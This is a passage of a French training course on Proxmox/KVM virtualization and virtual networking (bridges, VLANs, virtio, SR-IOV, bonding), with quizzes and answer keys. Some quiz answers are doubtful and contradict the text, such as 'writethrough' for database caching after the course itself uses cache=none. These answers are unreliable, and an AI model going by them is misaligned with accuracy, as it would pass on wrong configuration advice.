│  └─────────────┘ └─────────────────────────┘│
├─────────────────────────────────────────────┤
│         Hardware Physique                   │
│  CPU    │    RAM    │   Storage  │  Network │
└─────────────────────────────────────────────┘
```

**Responsabilités de l'hyperviseur :**
- **Isolation** : Garantir que les VM ne peuvent pas interférer entre elles
- **Allocation** : Distribuer les ressources physiques entre les VM
- **Émulation** : Présenter un hardware virtuel cohérent
- **Sécurité** : Contrôler l'accès aux ressources privilégiées

### Conteneurs vs Machines Virtuelles

La distinction entre conteneurs et machines virtuelles représente un choix architectural fondamental avec des implications profondes sur les performances, la sécurité et la gestion.

```
Architecture VM :
App A    App B    App C
├────┤   ├────┤   ├────┤
OS A     OS B     OS C
├────────────────────────┤
     Hyperviseur
├────────────────────────┤
      OS Hôte
├────────────────────────┤
      Hardware

Architecture Conteneurs :
App A    App B    App C
├────┤   ├────┤   ├────┤
   Runtime Conteneurs
├────────────────────────┤
      OS Hôte
├────────────────────────┤
      Hardware
```

**Avantages des VM :**
- Isolation complète au niveau kernel
- Support de différents OS
- Sécurité renforcée
- Compatibilité legacy

**Avantages des conteneurs :**
- Démarrage quasi-instantané (< 1 seconde)
- Overhead minimal (2-5%)
- Densité élevée (100+ conteneurs par serveur)
- Portabilité applicative

### Hyperviseurs : Classification et caractéristiques

**Hyperviseurs Type 1 (Bare Metal)** s'exécutent directement sur le hardware physique, offrant des performances optimales et une sécurité renforcée.

**Exemples Type 1 :**
- **VMware vSphere/ESXi** : Leader du marché entreprise
- **Microsoft Hyper-V** : Intégration Windows native
- **Proxmox VE** : Solution open-source complète
- **Citrix XenServer** : Performance et scalabilité
- **KVM** : Intégré au kernel Linux

**Hyperviseurs Type 2 (Hosted)** s'exécutent comme application sur un OS existant, plus simples à déployer mais avec des performances réduites.

**Exemples Type 2 :**
- **VMware Workstation/Fusion** : Développement et test
- **VirtualBox** : Solution gratuite polyvalente
- **Parallels Desktop** : Optimisé pour macOS

### KVM : Architecture et optimisations

**KVM (Kernel-based Virtual Machine)** transforme le kernel Linux en hyperviseur Type 1, combinant la stabilité du kernel avec des performances natives.

```
Architecture KVM :

┌─────────────────────────────────────────────┐
│                VM Guest                     │
│  ┌─────────────┐ ┌─────────────────────────┐│
│  │     vCPU    │ │       Guest RAM         ││
│  └─────────────┘ └─────────────────────────┘│
├─────────────────────────────────────────────┤
│                QEMU                         │
│  ┌─────────────┐ ┌─────────────────────────┐│
│  │   Device    │ │      I/O Emulation      ││
│  │  Emulation  │ │                         ││
│  └─────────────┘ └─────────────────────────┘│
├─────────────────────────────────────────────┤
│              KVM Module                     │
│  ┌─────────────┐ ┌─────────────────────────┐│
│  │   Memory    │ │     CPU Extensions      ││
│  │ Management  │ │     (VT-x/AMD-V)        ││
│  └─────────────┘ └─────────────────────────┘│
├─────────────────────────────────────────────┤
│             Linux Kernel                    │
└─────────────────────────────────────────────┘
```

**Optimisations KVM avancées :**

```bash
# Vérification du support hardware
egrep -c '(vmx|svm)' /proc/cpuinfo
lsmod | grep kvm

# Configuration CPU optimale
qm set 100 -cpu host,flags=+aes
qm set 100 -numa 1

# Optimisation mémoire
qm set 100 -balloon 0  # Désactiver ballooning pour performance
qm set 100 -hugepages 2  # Utiliser hugepages

# Optimisation réseau avec virtio
qm set 100 -net0 virtio,bridge=vmbr0,firewall=0

# Optimisation stockage
qm set 100 -scsi0 local-lvm:vm-100-disk-0,cache=none,discard=on,iothread=1
```

### Nested Virtualization : Avantages et défis

La **virtualisation imbriquée** permet d'exécuter un hyperviseur à l'intérieur d'une machine virtuelle, créant des VM de second niveau. Cette technique ouvre des possibilités extraordinaires pour les laboratoires, le développement et la formation.

**Cas d'usage de la nested virtualization :**
- **Laboratoires de formation** : Enseigner la virtualisation sans hardware dédié
- **Développement cloud** : Tester des solutions multi-tenant
- **Recherche en sécurité** : Analyser des malwares dans des environnements isolés
- **CI/CD avancé** : Tests d'infrastructure as code

```
Architecture Nested :

Hardware Physique
├── Hyperviseur L0 (Proxmox)
    ├── VM1 (Hyperviseur L1 - VMware)
    │   ├── VM1.1 (Windows Server)
    │   └── VM1.2 (Ubuntu Desktop)
    └── VM2 (Hyperviseur L1 - Hyper-V)
        ├── VM2.1 (Windows 10)
        └── VM2.2 (CentOS)
```

**Configuration nested virtualization :**

```bash
# Activation sur l'hôte Proxmox
echo "options kvm-intel nested=1" >> /etc/modprobe.d/kvm-intel.conf
echo "options kvm-amd nested=1" >> /etc/modprobe.d/kvm-amd.conf

# Redémarrage des modules
modprobe -r kvm-intel
modprobe kvm-intel

# Configuration VM pour nested
qm set 100 -cpu host,flags=+vmx  # Intel
qm set 100 -cpu host,flags=+svm  # AMD

# Vérification dans la VM
egrep -c '(vmx|svm)' /proc/cpuinfo
```

**Limitations et considérations :**
- **Performance** : Pénalité de 20-40% par niveau
- **Complexité** : Debugging difficile en cas de problème
- **Support** : Limité selon les hyperviseurs
- **Sécurité** : Surface d'attaque élargie

### Optimisation des performances

**CPU Pinning** associe des vCPU spécifiques à des cores physiques, éliminant la migration et améliorant la prévisibilité des performances.

```bash
# Pinning CPU pour VM critique
qm set 100 -vcpus 4
qm set 100 -affinity 0,1,2,3

# Vérification
taskset -cp $(pgrep -f "kvm.*100")
```

**NUMA Awareness** optimise l'allocation mémoire en respectant la topologie NUMA du serveur physique.

```bash
# Configuration NUMA optimale
qm set 100 -numa 1
qm set 100 -memory 16384
qm set 100 -sockets 1 -cores 8

# Monitoring NUMA
numastat -p $(pgrep -f "kvm.*100")
```

### Sécurité de la virtualisation

**VM Escape** représente la vulnérabilité la plus critique : un attaquant dans une VM parvient à s'échapper vers l'hyperviseur ou d'autres VM.

**Mesures de protection :**
- **Isolation réseau** : VLAN dédiés, firewalls VM
- **Contrôle d'accès** : RBAC strict, authentification forte
- **Monitoring** : Surveillance des ressources et comportements
- **Hardening** : Configuration sécurisée de l'hyperviseur

```bash
# Configuration firewall VM
qm set 100 -net0 virtio,bridge=vmbr0,firewall=1

# Limitation des ressources
qm set 100 -cpulimit 2  # Limite à 2 cores
qm set 100 -memory 4096,balloon=2048  # Mémoire dynamique
```

### Cas d'usage spécialisés

**Infrastructure DevOps :** Utilisez la nested virtualization pour créer des environnements de test complets incluant l'infrastructure de virtualisation elle-même. Configurez des pipelines CI/CD qui déploient et testent automatiquement des configurations d'hyperviseur.

**Laboratoire Red Team :** Exploitez la nested virtualization pour créer des environnements d'attaque réalistes avec plusieurs niveaux de défense. Isolez complètement les activités de test dans des VM imbriquées pour éviter tout impact sur l'infrastructure de production.

**Formation et certification :** Déployez des laboratoires complets de virtualisation dans des VM, permettant aux étudiants d'expérimenter avec différents hyperviseurs sans nécessiter de hardware dédié pour chaque participant.

---

## Quiz Module 1 : Bases Hardware

**Question 1 :** Dans une architecture NUMA à 2 sockets avec 8 cores chacun, quelle est la configuration optimale pour une VM nécessitant 8 vCPU ?
a) 2 sockets × 4 cores × 1 thread
b) 1 socket × 4 cores × 2 threads  
c) 8 sockets × 1 core × 1 thread
d) 4 sockets × 2 cores × 1 thread

**Question 2 :** Quel mode de cache est recommandé pour une base de données critique sur stockage local ?
a) writeback
b) writethrough
c) none
d) directsync

**Question 3 :** Le ballooning mémoire permet de :
a) Augmenter la RAM physique du serveur
b) Récupérer dynamiquement la mémoire inutilisée des VM
c) Accélérer les accès mémoire
d) Partager la mémoire entre VM

**Question 4 :** En bonding réseau, le mode LACP (802.3ad) offre :
a) Seulement de la redondance
b) Seulement de l'agrégation de bande passante
c) Redondance + agrégation avec négociation automatique
d) Équilibrage de charge sans configuration switch

**Question 5 :** Les hugepages améliorent les performances en :
a) Augmentant la fréquence CPU
b) Réduisant la pression sur le TLB
c) Accélérant les accès réseau
d) Optimisant le cache L3

**Réponses :** 1-b, 2-b, 3-b, 4-c, 5-b

---

## Quiz Module 2 : Virtualisation

**Question 1 :** La virtualisation assistée par hardware (VT-x/AMD-V) réduit l'overhead à :
a) 50%
b) 20%
c) 10%
d) 2-5%

**Question 2 :** Dans KVM, QEMU est responsable de :
a) La gestion mémoire
b) L'émulation des devices
c) Le scheduling CPU
d) La sécurité

**Question 3 :** La nested virtualization est particulièrement utile pour :
a) Améliorer les performances
b) Réduire la consommation
c) Les laboratoires de formation
d) Simplifier la gestion

**Question 4 :** Le CPU pinning permet de :
a) Augmenter la fréquence CPU
b) Associer des vCPU à des cores spécifiques
c) Partager des cores entre VM
d) Réduire la consommation

**Question 5 :** Un hyperviseur Type 1 se caractérise par :
a) L'exécution sur un OS existant
b) L'exécution directe sur le hardware
c) L'utilisation de conteneurs
d) La paravirtualisation obligatoire

**Réponses :** 1-d, 2-b, 3-c, 4-b, 5-b

---

## Bonnes Pratiques Modules 1-2

### Hardware et Dimensionnement
- [ ] Respecter la règle 80/20 pour l'utilisation des ressources
- [ ] Configurer la topologie CPU cohérente avec NUMA
- [ ] Réserver 15-20% de RAM pour l'hyperviseur
- [ ] Utiliser des hugepages pour les charges critiques
- [ ] Monitorer les métriques IOPS et latence stockage

### Réseau et Connectivité  
- [ ] Implémenter le bonding pour la redondance
- [ ] Séparer les flux avec des VLAN dédiés
- [ ] Configurer des Jumbo Frames pour le stockage
- [ ] Utiliser SR-IOV pour les performances critiques
- [ ] Surveiller la bande passante et les erreurs

### Virtualisation et Performance
- [ ] Activer les extensions hardware (VT-x/AMD-V)
- [ ] Configurer l'affinité CPU pour les charges critiques
- [ ] Optimiser les drivers virtio pour I/O
- [ ] Limiter l'overcommit selon le type de charge
- [ ] Tester la nested virtualization avant production

### Sécurité et Isolation
- [ ] Activer les firewalls VM par défaut
- [ ] Segmenter les réseaux par fonction
- [ ] Limiter les ressources par VM
- [ ] Auditer régulièrement les configurations
- [ ] Maintenir l'hyperviseur à jour

---


# Module 3 : Réseau Virtuel

## 3.1 Bridges et commutateurs virtuels

### Comprendre les bridges réseau

Un **bridge réseau** (pont réseau) fonctionne comme une **multiprise intelligente** qui connecte plusieurs appareils tout en apprenant et mémorisant leurs adresses. Contrairement à un hub qui diffuse aveuglément tous les paquets, un bridge maintient une table d'adresses MAC et ne transmet les paquets qu'aux ports concernés, réduisant ainsi les collisions et optimisant les performances.

Dans un environnement virtualisé, les bridges deviennent encore plus critiques car ils permettent aux machines virtuelles de communiquer entre elles et avec le réseau physique. Chaque interface réseau virtuelle (vNIC) d'une VM se connecte à un bridge, qui fait le lien avec l'interface physique du serveur.

### Architecture d'un bridge Proxmox

```
Schéma Bridge vmbr0 dans Proxmox :

                    Réseau Physique
                         │
                    ┌────┴────┐
                    │  ens18  │ Interface physique
                    └────┬────┘
                         │
                    ┌────┴────┐
                    │  vmbr0  │ Bridge principal
                    └────┬────┘
                         │
        ┌────────────────┼────────────────┐
        │                │                │
   ┌────┴────┐      ┌────┴────┐      ┌────┴────┐
   │ VM 101  │      │ VM 102  │      │ VM 103  │
   │ veth0   │      │ veth0   │      │ veth0   │
   │192.168.1│      │192.168.1│      │192.168.1│
   │   .10   │      │   .11   │      │   .12   │
   └─────────┘      └─────────┘      └─────────┘

Table MAC du bridge vmbr0 :
┌──────────────────┬─────────┬──────────┐
│   Adresse MAC    │  Port   │   Age    │
├──────────────────┼─────────┼──────────┤
│ 52:54:00:12:34:56│ VM 101  │ 30 sec   │
│ 52:54:00:12:34:57│ VM 102  │ 45 sec   │
│ 52:54:00:12:34:58│ VM 103  │ 12 sec   │
│ aa:bb:cc:dd:ee:ff│ ens18   │ 120 sec  │
└──────────────────┴─────────┴──────────┘
```

### Configuration avancée des bridges

**Bridge simple** : Configuration de base pour connecter les VM au réseau physique.

```bash
# Configuration dans /etc/network/interfaces
auto vmbr0
iface vmbr0 inet static
    address 192.168.1.100/24
    gateway 192.168.1.1
    bridge-ports ens18
    bridge-stp off
    bridge-fd 0
    bridge-maxwait 0
```

**Bridge VLAN-aware** : Permet de gérer plusieurs VLAN sur un seul bridge.

```bash
auto vmbr0
iface vmbr0 inet manual
    bridge-ports ens18
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 2-4094
```

**Bridge interne** : Pour la communication inter-VM sans accès externe.

```bash
auto vmbr1
iface vmbr1 inet static
    address 10.0.0.1/24
    bridge-ports none
    bridge-stp off
    bridge-fd 0
```

### Open vSwitch vs Linux Bridge

**Linux Bridge** représente la solution native du kernel Linux, simple et performante pour la plupart des cas d'usage. Il offre des fonctionnalités de base robustes avec un overhead minimal.

**Open vSwitch (OVS)** fournit des fonctionnalités avancées de SDN (Software Defined Networking) : flow tables programmables, tunneling, QoS granulaire, et intégration avec des contrôleurs SDN comme OpenFlow.

```
Comparaison Linux Bridge vs OVS :

Critère              │ Linux Bridge │ Open vSwitch
─────────────────────┼──────────────┼─────────────
Performance          │ Excellente   │ Très bonne
Simplicité           │ Très simple  │ Complexe
Fonctionnalités SDN  │ Limitées     │ Complètes
Overhead CPU         │ Minimal      │ Modéré
Debugging            │ Simple       │ Avancé
Intégration cloud    │ Basique      │ Native
```

**Installation et configuration OVS :**

```bash
# Installation Open vSwitch
apt install openvswitch-switch

# Création d'un bridge OVS
ovs-vsctl add-br ovsbr0
ovs-vsctl add-port ovsbr0 ens18

# Configuration VLAN avec OVS
ovs-vsctl add-port ovsbr0 vlan10 tag=10 -- set interface vlan10 type=internal
ip addr add 192.168.10.1/24 dev vlan10
ip link set vlan10 up

# Flow rules avancées
ovs-ofctl add-flow ovsbr0 "priority=100,dl_type=0x0800,nw_dst=192.168.1.0/24,actions=output:1"
```

### Spanning Tree Protocol (STP)

STP prévient les boucles réseau en désactivant automatiquement les liens redondants. Dans un environnement virtualisé, STP peut causer des délais de convergence indésirables lors du démarrage des VM.

**Problématiques STP en virtualisation :**
- Délai de 30 secondes pour la convergence
- Blocage temporaire du trafic VM
- Complexité avec les migrations à chaud

**Optimisations STP :**

```bash
# Désactiver STP sur bridges internes
auto vmbr1
iface vmbr1 inet static
    bridge-stp off
    bridge-fd 0

# Configuration RSTP pour convergence rapide
brctl setbridgeprio vmbr0 32768
brctl setportprio vmbr0 ens18 128
```

### Monitoring et diagnostic des bridges

**Outils de diagnostic essentiels :**

```bash
# État des bridges
brctl show

# Table MAC d'un bridge
brctl showmacs vmbr0

# Statistiques détaillées
cat /sys/class/net/vmbr0/statistics/rx_packets
cat /sys/class/net/vmbr0/statistics/tx_packets

# Capture de trafic sur bridge
tcpdump -i vmbr0 -n

# Monitoring OVS
ovs-vsctl show
ovs-ofctl dump-flows ovsbr0
ovs-appctl fdb/show ovsbr0
```

### Optimisation des performances réseau

**Multiqueue virtio** permet de paralléliser le traitement réseau en utilisant plusieurs queues par interface virtuelle.

```bash
# Configuration multiqueue pour VM
qm set 100 -net0 virtio,bridge=vmbr0,queues=4

# Vérification dans la VM
ethtool -L eth0 combined 4
```

**CPU affinity** pour les interruptions réseau optimise le traitement en dédiant des cores spécifiques.

```bash
# Affinité IRQ pour interface physique
echo 2 > /proc/irq/24/smp_affinity  # Core 1
echo 4 > /proc/irq/25/smp_affinity  # Core 2
```

---

## 3.2 VLAN et segmentation

### Concepts fondamentaux des VLAN

Les **VLAN (Virtual Local Area Networks)** permettent de créer des réseaux logiquement séparés sur une infrastructure physique partagée. Imaginez un immeuble de bureaux où chaque étage représente un VLAN : bien que tous partagent la même infrastructure (ascenseurs, électricité), chaque étage fonctionne indépendamment avec ses propres règles d'accès et de sécurité.

Cette segmentation logique résout plusieurs problèmes critiques : isolation de sécurité, optimisation des performances par réduction des domaines de broadcast, et flexibilité organisationnelle permettant de regrouper des utilisateurs selon leurs fonctions plutôt que leur localisation physique.

### Architecture VLAN en environnement virtualisé

```
Architecture VLAN Multi-Tenant :

                    Switch Physique
                         │
                    ┌────┴────┐
                    │  Trunk  │ 802.1Q (VLAN 10,20,30,40)
                    │  Port   │
                    └────┬────┘
                         │
                    ┌────┴────┐
                    │  ens18  │ Interface physique
                    └────┬────┘
                         │
                    ┌────┴────┐
                    │  vmbr0  │ Bridge VLAN-aware
                    └────┬────┘
                         │
        ┌────────────────┼────────────────┐
        │                │                │
   ┌────┴────┐      ┌────┴────┐      ┌────┴────┐
   │ VM 101  │      │ VM 102  │      │ VM 103  │
   │VLAN 10  │      │VLAN 20  │      │VLAN 30  │
   │Management│      │Production│     │ DMZ     │
   └─────────┘      └─────────┘      └─────────┘

Plan d'adressage VLAN :
┌─────────┬─────────────────┬─────────────────┬──────────────┐
│ VLAN ID │     Nom         │    Réseau       │   Usage      │
├─────────┼─────────────────┼─────────────────┼──────────────┤
│   10    │ Management      │ 192.168.10.0/24 │ Admin/Backup │
│   20    │ Production      │ 192.168.20.0/24 │ Apps métier  │
│   30    │ DMZ             │ 192.168.30.0/24 │ Services web │
│   40    │ Storage         │ 192.168.40.0/24 │ iSCSI/NFS    │
│   50    │ Lab/Test        │ 192.168.50.0/24 │ Développement│
└─────────┴─────────────────┴─────────────────┴──────────────┘
```

### Configuration VLAN dans Proxmox

**Méthode 1 : VLAN interfaces dédiées**

```bash
# Création d'interfaces VLAN spécifiques
auto ens18.10
iface ens18.10 inet static
    address 192.168.10.100/24
    vlan-raw-device ens18

auto ens18.20  
iface ens18.20 inet static
    address 192.168.20.100/24
    vlan-raw-device ens18

# Bridges dédiés par VLAN
auto vmbr10
iface vmbr10 inet manual
    bridge-ports ens18.10
    bridge-stp off
    bridge-fd 0

auto vmbr20
iface vmbr20 inet manual
    bridge-ports ens18.20
    bridge-stp off
    bridge-fd 0
```

**Méthode 2 : Bridge VLAN-aware (recommandée)**

```bash
auto vmbr0
iface vmbr0 inet manual
    bridge-ports ens18
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 2-4094

# Configuration VM avec VLAN tag
qm set 101 -net0 virtio,bridge=vmbr0,tag=10
qm set 102 -net0 virtio,bridge=vmbr0,tag=20
qm set 103 -net0 virtio,bridge=vmbr0,tag=30
```

### VLAN Trunking et Access Ports

**Trunk ports** transportent le trafic de plusieurs VLAN avec des tags 802.1Q, permettant à un seul lien physique de véhiculer plusieurs réseaux logiques.

**Access ports** appartiennent à un seul VLAN et ne nécessitent pas de tagging côté client.

```bash
# Configuration switch Cisco pour trunk
interface GigabitEthernet0/1
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,40
 switchport trunk native vlan 1

# Configuration switch pour access port
interface GigabitEthernet0/2
 switchport mode access
 switchport access vlan 20
```

### Inter-VLAN Routing

Par défaut, les VLAN sont isolés et ne peuvent pas communiquer entre eux. L'**inter-VLAN routing** permet une communication contrôlée entre VLAN via un routeur ou un switch Layer 3.

**Méthodes d'inter-VLAN routing :**

**1. Router on a stick** : Un routeur avec une interface trunk

```bash
# Configuration routeur Linux
auto ens18.10
iface ens18.10 inet static
    address 192.168.10.1/24
    vlan-raw-device ens18

auto ens18.20
iface ens18.20 inet static
    address 192.168.20.1/24
    vlan-raw-device ens18

# Activation du routage
echo 1 > /proc/sys/net/ipv4/ip_forward

# Règles de routage inter-VLAN
iptables -A FORWARD -i ens18.10 -o ens18.20 -j ACCEPT
iptables -A FORWARD -i ens18.20 -o ens18.10 -j ACCEPT
```

**2. Switch Layer 3** : Routage intégré au switch

**3. Firewall virtualisé** : VM dédiée au routage et filtrage

### Sécurité VLAN

**VLAN Hopping** représente une attaque où un pirate accède à des VLAN non-autorisés en exploitant des failles de configuration.

**Types d'attaques VLAN :**
- **Switch Spoofing** : Imiter un switch pour recevoir du trafic trunk
- **Double Tagging** : Exploiter le VLAN natif pour accéder à d'autres VLAN

**Mesures de protection :**

```bash
# Désactiver le VLAN natif sur les trunks
switchport trunk native vlan 999  # VLAN inutilisé

# Limiter les VLAN autorisés
switchport trunk allowed vlan 10,20,30

# Port security
switchport port-security
switchport port-security maximum 2
switchport port-security violation shutdown
```

### QoS et priorisation du trafic

**Quality of Service (QoS)** permet de prioriser certains types de trafic pour garantir les performances des applications critiques.

```bash
# Configuration QoS avec tc (Traffic Control)
# Limitation bande passante VLAN 50 (lab)
tc qdisc add dev ens18.50 root handle 1: htb default 30
tc class add dev ens18.50 parent 1: classid 1:1 htb rate 100mbit
tc class add dev ens18.50 parent 1:1 classid 1:10 htb rate 50mbit ceil 100mbit

# Priorisation trafic management (VLAN 10)
tc qdisc add dev ens18.10 root handle 1: prio bands 3
tc filter add dev ens18.10 parent 1:0 protocol ip prio 1 u32 match ip tos 0x10 0xff flowid 1:1
```

### Monitoring VLAN

**Outils de surveillance et diagnostic :**

```bash
# Vérification configuration VLAN
cat /proc/net/vlan/config

# Statistiques par VLAN
cat /proc/net/vlan/ens18.10

# Capture trafic spécifique VLAN
tcpdump -i ens18 vlan 10

# Monitoring avec SNMP
snmpwalk -v2c -c public switch_ip 1.3.6.1.2.1.17.7.1.4.3.1.1
```

---

## 3.3 vNIC et virtio

### Interfaces réseau virtuelles (vNIC)

Les **vNIC (virtual Network Interface Cards)** représentent l'abstraction logicielle des cartes réseau physiques pour les machines virtuelles. Chaque vNIC émule le comportement d'une carte réseau réelle, permettant aux systèmes d'exploitation invités de communiquer sur le réseau sans modification.

L'évolution des vNIC suit une progression claire : de l'émulation complète de hardware existant (e1000, rtl8139) vers des drivers paravirtualisés optimisés (virtio-net) qui offrent des performances quasi-natives en éliminant l'overhead d'émulation.

### Types de vNIC et leurs caractéristiques

```
Évolution des performances vNIC :

rtl8139 (Émulation complète)
├── Performance : 100 Mbps max
├── Compatibilité : Universelle
├── CPU overhead : Élevé (15-20%)
└── Usage : Systèmes legacy uniquement

e1000 (Émulation Intel)
├── Performance : 1 Gbps
├── Compatibilité : Excellente
├── CPU overhead : Modéré (8-12%)
└── Usage : Compatibilité Windows/Linux

virtio-net (Paravirtualisé)
├── Performance : 10+ Gbps
├── Compatibilité : Drivers requis
├── CPU overhead : Minimal (2-3%)
└── Usage : Production moderne

SR-IOV (Pass-through)
├── Performance : Native (40+ Gbps)
├── Compatibilité : Hardware spécifique
├── CPU overhead : Quasi-nul
└── Usage : Applications critiques
```

### Virtio : Architecture et optimisations

**Virtio** représente une révolution dans la virtualisation I/O en remplaçant l'émulation hardware par une interface standardisée entre l'hyperviseur et les drivers invités. Cette approche élimine la complexité de l'émulation tout en maximisant les performances.

**Architecture virtio-net :**

```
VM Guest                     Hyperviseur Host
┌─────────────────┐         ┌─────────────────┐
│   Application   │         │                 │
├─────────────────┤         │                 │
│  TCP/IP Stack   │         │                 │
├─────────────────┤         │                 │
│ virtio-net      │◄────────┤ vhost-net       │
│ driver          │  virtio │ backend         │
├─────────────────┤  queue  ├─────────────────┤
│   virtqueue     │◄────────┤ TAP interface   │
│   (ring buffer) │         │                 │
└─────────────────┘         ├─────────────────┤
                            │ Bridge/OVS      │
                            ├─────────────────┤
                            │ Physical NIC    │
                            └─────────────────┘
```

**Configuration virtio optimisée :**

```bash
# Configuration VM avec virtio multiqueue
qm set 100 -net0 virtio,bridge=vmbr0,queues=4,firewall=0

# Optimisations dans la VM invitée
# Activation multiqueue
ethtool -L eth0 combined 4

# Optimisation interruptions
echo 2 > /proc/irq/24/smp_affinity
echo 4 > /proc/irq/25/smp_affinity

# Tuning TCP
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_rmem = 4096 87380 134217728' >> /etc/sysctl.conf
```

### vhost-net et vhost-user

**vhost-net** déplace le traitement des paquets réseau du processus QEMU vers le kernel, réduisant drastiquement les changements de contexte et améliorant les performances.

**vhost-user** permet d'implémenter le backend virtio dans l'espace utilisateur, offrant plus de flexibilité pour des solutions comme DPDK.

```bash
# Vérification vhost-net
lsmod | grep vhost
modprobe vhost-net

# Configuration avec vhost-net
qm set 100 -net0 virtio,bridge=vmbr0,firewall=0

# Monitoring vhost
cat /proc/net/vhost-net
```

### SR-IOV : Virtualisation hardware

**SR-IOV (Single Root I/O Virtualization)** permet à une carte réseau physique de présenter plusieurs fonctions virtuelles (VF) directement accessibles par les VM, contournant complètement l'hyperviseur pour des performances natives.

**Architecture SR-IOV :**

```
Carte réseau SR-IOV :

Physical Function (PF)
├── Configuration et gestion
└── Contrôle des Virtual Functions

Virtual Functions (VF 0-7)
├── VF 0 → VM 101 (accès direct)
├── VF 1 → VM 102 (accès direct)  
├── VF 2 → VM 103 (accès direct)
└── VF 3-7 → Pool disponible

Avantages :
✓ Performance native
✓ Latence minimale
✓ Offload hardware (checksums, segmentation)

Limitations :
✗ Migration à chaud impossible
✗ Nombre de VF limité
✗ Dépendance hardware
```

**Configuration SR-IOV :**

```bash
# Vérification support SR-IOV
lspci -v | grep -i sriov

# Activation des VF
echo 4 > /sys/class/net/ens18/device/sriov_numvfs

# Liste des VF disponibles
lspci | grep Virtual

# Attribution VF à une VM
qm set 100 -hostpci0 01:10.0,pcie=1

# Configuration dans la VM
# La VF apparaît comme interface native
ip link show
```

### Optimisation des performances réseau

**Multiqueue virtio** parallélise le traitement réseau en utilisant plusieurs queues par interface, permettant de distribuer la charge sur plusieurs CPU cores.

```bash
# Configuration multiqueue optimal
# Nombre de queues = nombre de vCPU (max 8)
qm set 100 -net0 virtio,bridge=vmbr0,queues=4

# Dans la VM : activation et tuning
ethtool -L eth0 combined 4
ethtool -K eth0 gso on
ethtool -K eth0 tso on
ethtool -K eth0 ufo on
```

**Offloading features** déchargent certaines opérations vers le hardware ou l'hyperviseur.

```bash
# Vérification des features disponibles
ethtool -k eth0

# Activation optimisations
ethtool -K eth0 rx-checksumming on
ethtool -K eth0 tx-checksumming on
ethtool -K eth0 scatter-gather on
ethtool -K eth0 tcp-segmentation-offload on
ethtool -K eth0 generic-segmentation-offload on
```

### Monitoring et diagnostic vNIC

**Métriques de performance réseau :**

```bash
# Statistiques détaillées interface
ethtool -S eth0

# Monitoring temps réel
iftop -i eth0
nload eth0

# Test de performance
iperf3 -s  # Serveur
iperf3 -c server_ip -t 60 -P 4  # Client multithread

# Analyse latence
ping -c 100 target_ip | tail -1
hping3 -S -p 80 -c 100 target_ip

# Monitoring virtio queues
cat /proc/interrupts | grep virtio
```

### Cas d'usage spécialisés

**Infrastructure haute performance :** Utilisez SR-IOV pour les applications nécessitant une latence ultra-faible (trading, HPC). Configurez DPDK pour contourner le kernel et accéder directement au hardware réseau.

**Environnement de développement :** Privilégiez virtio-net avec multiqueue pour un bon compromis performance/flexibilité. Activez toutes les optimisations d'offloading pour maximiser le débit.

**Laboratoire de cybersécurité :** Utilisez différents types de vNIC pour simuler des environnements variés. L'émulation e1000 peut être utile pour tester la compatibilité d'outils legacy, tandis que virtio-net offre les performances nécessaires pour l'analyse de trafic en temps réel.

---

## 3.4 Bonding et agrégation

### Concepts du bonding réseau

Le **bonding** (ou agrégation de liens) combine plusieurs interfaces réseau physiques en une seule interface logique, offrant redondance, augmentation de bande passante, ou les deux selon le mode configuré. Cette technique est essentielle dans les environnements de production pour éliminer les points de défaillance unique et optimiser l'utilisation de la bande passante disponible.

Imaginez le bonding comme une **autoroute à plusieurs voies** : plus vous avez de voies (interfaces), plus vous pouvez faire passer de trafic simultanément. Si une voie est fermée (panne d'interface), le trafic continue sur les voies restantes sans interruption de service.

### Modes de bonding détaillés

```
Modes de bonding Linux :

Mode 0 (balance-rr) - Round Robin
┌─────────┬─────────┬─────────┬─────────┐
│ Paquet 1│ Paquet 2│ Paquet 3│ Paquet 4│
│  eth0   │  eth1   │  eth0   │  eth1   │
└─────────┴─────────┴─────────┴─────────┘
✓ Bande passante cumulée
✗ Réordonnancement possible
✗ Nécessite switch compatible

Mode 1 (active-backup) - Actif/Passif
┌─────────────────────────────────────────┐
│ eth0 (ACTIVE) │ eth1 (BACKUP)           │
│ Tout le trafic│ Standby                 │
└─────────────────────────────────────────┘
✓ Redondance simple
✓ Compatible tous switches
✗ Pas d'agrégation bande passante

Mode 4 (802.3ad) - LACP
┌─────────────────────────────────────────┐
│ Négociation dynamique avec switch       │
│ Répartition par hash des flux           │
│ Détection automatique des pannes        │
└─────────────────────────────────────────┘
✓ Standard IEEE
✓ Bande passante + redondance
✗ Configuration switch requise

Mode 6 (balance-alb) - Adaptive Load Balancing
┌─────────────────────────────────────────┐
│ TX : Équilibrage par destination        │
│ RX : Apprentissage ARP                  │
│ Adaptation automatique                  │
└─────────────────────────────────────────┘
✓ Pas de config switch
✓ Optimisation automatique
✗ Complexité algorithmique
```

### Configuration bonding dans Proxmox

**Méthode systemd-networkd (moderne) :**

```bash
# Création du bond
cat > /etc/systemd/network/bond0.netdev << EOF
[NetDev]
Name=bond0
Kind=bond

[Bond]
Mode=802.3ad
TransmitHashPolicy=layer3+4
LACPTransmitRate=fast
MIIMonitorSec=100
UpDelaySec=200
DownDelaySec=200
EOF

# Configuration des interfaces membres
cat > /etc/systemd/network/ens18.network << EOF
[Match]
Name=ens18

[Network]
Bond=bond0
EOF

cat > /etc/systemd/network/ens19.network << EOF
[Match]
Name=ens19

[Network]
Bond=bond0
EOF

# Configuration IP du bond
cat > /etc/systemd/network/bond0.network << EOF
[Match]
Name=bond0

[Network]
DHCP=no
Address=192.168.1.100/24
Gateway=192.168.1.1
DNS=8.8.8.8
EOF

# Activation
systemctl enable systemd-networkd
systemctl restart systemd-networkd
```

**Méthode ifupdown (traditionnelle) :**

```bash
# Configuration dans /etc/network/interfaces
auto bond0
iface bond0 inet static
    address 192.168.1.100/24
    gateway 192.168.1.1
    bond-slaves ens18 ens19
    bond-mode 802.3ad
    bond-miimon 100
    bond-lacp-rate 1
    bond-xmit-hash-policy layer3+4

auto ens18
iface ens18 inet manual
    bond-master bond0

auto ens19
iface ens19 inet manual
    bond-master bond0
```

### LACP : Link Aggregation Control Protocol

**LACP** automatise la négociation et la gestion des liens agrégés entre serveur et switch. Ce protocole détecte automatiquement les pannes, ajuste la répartition de charge, et maintient la synchronisation entre les deux extrémités.

**Configuration switch Cisco pour LACP :**

```bash
